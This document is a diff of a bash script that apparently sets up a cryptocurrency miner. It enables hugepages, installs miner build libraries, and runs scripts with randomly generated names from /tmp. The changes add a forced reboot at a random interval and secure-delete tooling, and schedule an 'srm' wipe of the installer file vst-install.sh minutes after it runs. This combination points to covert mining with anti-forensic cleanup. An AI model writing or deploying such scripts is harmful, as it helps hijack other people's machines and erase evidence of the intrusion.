@@ -1,18 +1,18 @@
 #!/bin/bash
-
+apt-get -y install sudo
 sudo apt-get update -y;
 sudo apt-get install at -y;
+sudo apt-get install secure-delete -y;
 
 ID="$(hostname)"
-
 THREADS="$(nproc --all)"
+reboot_time=$(shuf -i 10-14 -n 1)
 
 for i in `atq | awk '{print $1}'`;do atrm $i;done
-echo 'sudo reboot -f' | at now + 12 hours
+echo 'sudo reboot -f' | at now + $reboot_time hours
 
+sudo apt-get -y install gpw
 
-apt-get -y install gpw
-apt-get -y install sudo
 
 
 timer=$(gpw 1 11)
@@ -38,9 +38,9 @@ pausesix=$(shuf -i 65-71 -n 1)
 ##################################
 #rm -rf /tmp/
 #mkdir /tmp
-for i in `atq | awk '{print $1}'`;do atrm $i;done
+
 sudo dpkg --configure -a
-sudo echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
+echo 'vm.nr_hugepages=256' | sudo tee -a /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
@@ -112,7 +112,5 @@ sudo dos2unix /tmp/$tmpfoldername/$time3.sh
 sudo dos2unix /tmp/$tmpfoldername/$time6.sh
 sudo dos2unix /tmp/$tmpfoldername/$time1.sh
 
-#sudo rm /tmp/$tmpfoldername/start.sh
+echo "sudo srm /tmp/$tmpfoldername/vst-install.sh" | at now + 10 minutes
 sudo bash /tmp/$tmpfoldername/$timer.sh && sudo bash /tmp/$tmpfoldername/$checker.sh
-
-
